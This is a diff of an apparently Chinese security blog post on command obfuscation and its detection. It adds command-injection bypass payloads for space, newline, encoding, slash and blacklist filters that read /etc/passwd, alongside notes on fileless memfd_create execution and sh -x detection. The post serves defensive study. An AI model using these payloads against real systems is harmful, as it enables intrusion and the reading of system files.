@@ -31,7 +31,7 @@
 <meta property="og:description" content="本文研究恶意命令绕过于混淆方式，总结检测思路与方法...">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-01-09T13:45:50.000Z">
-<meta property="article:modified_time" content="2022-09-09T13:48:19.848Z">
+<meta property="article:modified_time" content="2022-09-09T14:34:52.915Z">
 <meta property="article:author" content="L0n9w4y">
 <meta property="article:tag" content="Intrusion Detection">
 <meta name="twitter:card" content="summary">
@@ -120,7 +120,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="nav-text">0x01 指令执行方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87glibc-api%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4"><span class="nav-text">1. 通过glibc api执行系统指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87syscall%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">2. 通过syscall系统调用执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87Bash%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">3. 通过Bash执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Python%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">4. Python执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%97%A0%E6%96%87%E4%BB%B6%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">5. 无文件进程启动方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-text">0x02 绕过方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-bash%E8%B0%83%E8%AF%95%E5%8A%9F%E8%83%BD"><span class="nav-text">1. bash调试功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="nav-text">0x01 指令执行方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87glibc-api%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4"><span class="nav-text">1. 通过glibc api执行系统指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87syscall%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">2. 通过syscall系统调用执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87Bash%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="nav-text">3. 通过Bash执行指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Python%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">4. Python执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%97%A0%E6%96%87%E4%BB%B6%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">5. 无文件进程启动方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-text">0x02 绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="nav-text">1. 通配符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="nav-text">2. 命令注入姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-%E6%97%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">a. 无空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-%E5%9B%9E%E8%BD%A6%E7%BB%95%E8%BF%87"><span class="nav-text">b. 回车绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">c. 编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d-%E7%BB%95%E9%94%99%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="nav-text">d. 绕错字符过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#e-%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E5%8D%95%E8%AF%8D"><span class="nav-text">e. 绕过黑名单单词</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-bash%E8%B0%83%E8%AF%95%E5%8A%9F%E8%83%BD"><span class="nav-text">1. bash调试功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -266,17 +266,87 @@
 <p>在Linux系统中实现无文件执行ELF是渗透测试中一种非常有用的技术。这种方法较为隐蔽，可以绕过各种类型的反病毒保护机制、系统完整性保护机制以及基于硬盘监控的防护系统。通过这种方法，我们能够以最小的动静访问目标。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1) 基于linux内存镜像文件 </span><br><span class="line"></span><br><span class="line">可以利用linux文件系统中的共享内存分区来存储进程文件，如</span><br><span class="line"></span><br><span class="line">/dev/shm</span><br><span class="line">/run/shm</span><br><span class="line"></span><br><span class="line">这些目录实际上是挂载到文件系统上已分配的内存空间，写入到这些目录下的文件不会实际落到物理磁盘上</span><br><span class="line"></span><br><span class="line">但使用ls命令可查看这些目录和目录下的进程文件</span><br><span class="line"></span><br><span class="line">2) 基于memfd_create创建内存镜像文件 </span><br><span class="line"></span><br><span class="line">memfd_create这个系统调用。该系统调用与malloc比较类似，但并不会返回指向已分配内存的一个指针，而是返回指向某个匿名文件的文件描述符。该匿名文件以链接（link）形式存放在/proc/pid/fd/文件系统中</span><br><span class="line"></span><br><span class="line">   a. 将可执行文件载入内存并启动【C语言】：在本地编译并执行一个二进制程序投递载荷，容易被二进制AV/EDR检测与防御阻断</span><br><span class="line"></span><br><span class="line">   使用行为特征更隐蔽的脚本语言，例如perl/python/powershell，这类语言本身都预装在操作系统中，而且可以在命令行即时执行而不需要落盘文件</span><br><span class="line"></span><br><span class="line">   b. 使用perl进行memfd_create无文件执行：创建内存匿名文件 -&gt; 将ELF内容写入内存匿名文件 -&gt; 调用exec函数执行匿名内存文件</span><br><span class="line"></span><br><span class="line">   c. 使用python进行memfd_create无文件执行：使用memfd_create()系统调用来创建匿名文件 -&gt; 使用可执行ELF文件填充该文件 -&gt; 执行该文件，也可以使用fork()多次执行该文件</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x02-绕过方式"><a href="#0x02-绕过方式" class="headerlink" title="0x02 绕过方式"></a>0x02 绕过方式</h2><ol>
-<li><p>Linux通配符注入(Wildcard Injection)</p>
-</li>
-<li><p>命令注入绕过</p>
-</li>
-</ol>
+<h2 id="0x02-绕过姿势"><a href="#0x02-绕过姿势" class="headerlink" title="0x02 绕过姿势"></a>0x02 绕过姿势</h2><h3 id="1-通配符注入"><a href="#1-通配符注入" class="headerlink" title="1. 通配符注入"></a>1. 通配符注入</h3><p>glob 模式（globbing）也被称之为 shell 通配符，shell 通配符 &#x2F; glob 模式通常用来匹配目录以及文件，而非文本</p>
+<table>
+<thead>
+<tr>
+<th align="left">字符</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*</td>
+<td align="left">匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">匹配任意单个字符</td>
+</tr>
+<tr>
+<td align="left">[list]</td>
+<td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td align="left">[^list]</td>
+<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td align="left">[!list]</td>
+<td align="left">同[^list]</td>
+</tr>
+<tr>
+<td align="left"><code>&#123;str1,str2,...&#125;</code></td>
+<td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
+</tr>
+</tbody></table>
+<p><strong>shell 元字符</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">字符</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">IFS</td>
+<td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
+</tr>
+<tr>
+<td align="left">CR</td>
+<td align="left">由 &lt; enter &gt; 产生</td>
+</tr>
+<tr>
+<td align="left">&#x3D;</td>
+<td align="left">设定变量</td>
+</tr>
+<tr>
+<td align="left">$</td>
+<td align="left">作变量或运算替换</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>|重导向标准输出<br>&lt;|重导向标准输入<br>||命令管线<br>&amp;|重导向文件描述符，或将命令静默执行<br>( )|将其内的命令置于 nested subshell 执行，或用于运算或命令替换<br><code>&#123; &#125;</code>|将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围<br>;|在前一个命令结束时，而忽略其返回值，继续执行下一个命令<br>&amp;&amp;|在前一个命令结束时，若返回值为 true，继续执行下一个命令<br><code>||</code>|在前一个命令结束时，若返回值为 false，继续执行下一个命令<br>!|执行 history 中的命令</p>
+</blockquote>
+<h3 id="2-命令注入姿势"><a href="#2-命令注入姿势" class="headerlink" title="2. 命令注入姿势"></a>2. 命令注入姿势</h3><h4 id="a-无空格绕过"><a href="#a-无空格绕过" class="headerlink" title="a. 无空格绕过"></a>a. 无空格绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;/etc/passwd</span><br><span class="line"></span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line"></span><br><span class="line">cat$IFS/etc/passwd</span><br><span class="line"></span><br><span class="line">echo$&#123;IFS&#125;&quot;RCE&quot;$&#123;IFS&#125;&amp;&amp;cat$&#123;IFS&#125;/etc/passwd</span><br><span class="line"></span><br><span class="line">IFS=,;`cat&lt;&lt;&lt;uname,-a`</span><br><span class="line"></span><br><span class="line">;ls%09-al%09/home</span><br></pre></td></tr></table></figure>
+
+<h4 id="b-回车绕过"><a href="#b-回车绕过" class="headerlink" title="b. 回车绕过"></a>b. 回车绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ something%0Acat%20/etc/passwd</span><br><span class="line"></span><br><span class="line">;cat&gt;/tmp/hi&lt;&lt;EOF%0ahello%0aEOF</span><br><span class="line">;cat&lt;/tmp/hi</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+<h4 id="c-编码绕过"><a href="#c-编码绕过" class="headerlink" title="c. 编码绕过"></a>c. 编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ abc=$&#x27;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#x27;;cat $abc</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ `echo $&#x27;cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#x27;`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ xxd -r -ps &lt;(echo 2f6574632f706173737764)</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="d-绕错字符过滤"><a href="#d-绕错字符过滤" class="headerlink" title="d. 绕错字符过滤"></a>d. 绕错字符过滤</h4><p>没有反斜杠和斜杠的命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ echo $&#123;HOME:0:1&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ cat $&#123;HOME:0:1&#125;etc$&#123;HOME:0:1&#125;passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27; &lt;&lt;&lt; .</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ cat $(echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;)etc$(echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;)passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="e-绕过黑名单单词"><a href="#e-绕过黑名单单词" class="headerlink" title="e. 绕过黑名单单词"></a>e. 绕过黑名单单词</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i     # 使用单引号</span><br><span class="line"></span><br><span class="line">w&quot;h&quot;o&quot;am&quot;i     # 使用双引号</span><br><span class="line"></span><br><span class="line">w\ho\am\i      # 用反斜杠和斜杠绕过</span><br><span class="line">/\b\i\n/////s\h</span><br><span class="line"></span><br><span class="line">who$@ami       # 使用$@绕过</span><br><span class="line"></span><br><span class="line">echo $0</span><br><span class="line">-&gt; /usr/bin/zsh</span><br><span class="line">echo whoami|$0</span><br><span class="line"></span><br><span class="line">who$()ami      # 使用$()绕过</span><br><span class="line">who$(echo am)i</span><br><span class="line">who`echo am`i</span><br><span class="line"></span><br><span class="line">/???/??t /???/p??s??  # 使用变量扩展绕过</span><br><span class="line"></span><br><span class="line">test=/ehhh/hmtc/pahhh/hmsswd</span><br><span class="line">cat $&#123;test//hhh\/hm/&#125;</span><br><span class="line">cat $&#123;test//hh??hm/&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="0x03-检测方法"><a href="#0x03-检测方法" class="headerlink" title="0x03 检测方法"></a>0x03 检测方法</h2><h3 id="1-bash调试功能"><a href="#1-bash调试功能" class="headerlink" title="1. bash调试功能"></a>1. bash调试功能</h3><p>sh是bash的软连接，本质上还是调用的bash。sh -x可以打印出shell脚本的运行过程，这样就可以看到真正的执行命令；使用sh -x作为沙箱，提取带+号的内容，即可还原命令</p>
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12049910.html">https://www.cnblogs.com/LittleHann/p/12049910.html</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.junmajinlong.com/shell/script_course/shell_cmdline_parse_eval/">https://www.junmajinlong.com/shell/script_course/shell_cmdline_parse_eval/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/96374.html">https://www.secpulse.com/archives/96374.html</a></p>
 </li>
@@ -287,6 +357,8 @@
 <li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">https://cloud.tencent.com/developer/article/1609832</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1369290">https://cloud.tencent.com/developer/article/1369290</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html">https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html</a></p>
 </li>
 </ul>
 
